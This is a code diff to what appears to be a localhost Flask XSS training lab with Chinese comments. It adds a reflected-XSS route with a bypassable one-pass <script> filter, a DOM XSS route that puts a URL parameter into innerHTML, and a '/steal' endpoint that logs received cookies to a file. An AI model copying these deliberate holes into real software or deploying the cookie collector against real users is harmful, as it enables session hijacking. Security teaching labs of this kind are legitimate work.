@@ -6,7 +6,8 @@ app = Flask(__name__)
 @app.route('/reflect')
 def reflect():
     user_input = request.args.get('q', '')
-    # 故意不做任何过滤，直接拼接到HTML
+    # 简单过滤：只删除一次 <script> 和 </script>
+    user_input = user_input.replace('<script>', '').replace('</script>', '')
     template = f"<html><body>你搜索的内容是: {user_input}</body></html>"
     return render_template_string(template)
 
@@ -27,6 +28,30 @@ def stored():
     </form>
     '''
     return render_template_string(f"<html><body>{form}<hr>{comment_html}</body></html>")
+@app.route('/dom2')
+def dom2():
+    return '''
+    <html><body>
+    <h1>DOM XSS Demo (URL参数)</h1>
+    <div id="content"></div>
+    <script>
+        var params = new URLSearchParams(window.location.search);
+        var q = params.get('q');
+        document.getElementById("content").innerHTML = decodeURIComponent(q);
+    </script>
+    </body></html>
+    '''
+@app.route('/steal')
+@app.route('/steal')
+def steal():
+    cookie = request.args.get('cookie', '')
+    with open('stolen_cookies.txt', 'a', encoding='utf-8') as f:
+        if cookie:
+            f.write(cookie + '\n')
+        else:
+            f.write('(empty cookie)\n')
+    print(f"[+] 接收到窃取的Cookie: {cookie}")
+    return 'ok'
 
 if __name__ == '__main__':
     app.run(host='127.0.0.1', port=5001, debug=True)
